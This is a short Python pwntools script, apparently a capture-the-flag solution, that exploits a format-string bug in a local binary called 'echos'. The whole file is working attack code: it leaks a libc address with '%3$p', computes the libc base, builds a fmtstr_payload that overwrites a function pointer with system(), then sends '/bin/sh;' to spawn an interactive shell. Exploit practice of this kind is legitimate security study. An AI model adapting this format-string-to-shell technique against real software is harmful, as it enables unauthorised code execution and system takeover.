 
import sys
import os
from pwn import *


def exec_fmt(payload):
    p.sendline(payload)
    return p.recvline()


def exploit():
    p.sendline("%3$p")
    read17 = int(p.recvline(), 16)
    log.info("read: 0x{:x}".format(read17 - 17))
    libc.address = read17 - libc.symbols['read'] - 17
    log.info("libc.address: 0x{:x}".format(libc.address))

    payload = fmtstr_payload(8, {
        libc.address+0x3eb048-4: (libc.symbols["system"] & 0xffffffff) << 32
    }, numbwritten=0, write_size='short')
    print hex((libc.symbols["system"] & 0xffffffff) << 32)

    print(len(payload))
    gdb.attach(p, 'b *main+51')
    p.sendline(payload)
    p.sendline("/bin/sh;")
    p.interactive()


if __name__ == "__main__":
    # context.terminal = ["tmux", "sp", "-h"]
    context.arch = "amd64"

    name = "./echos"

    binary = ELF(name, checksec=False)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    p = process(name, env={})
    exploit()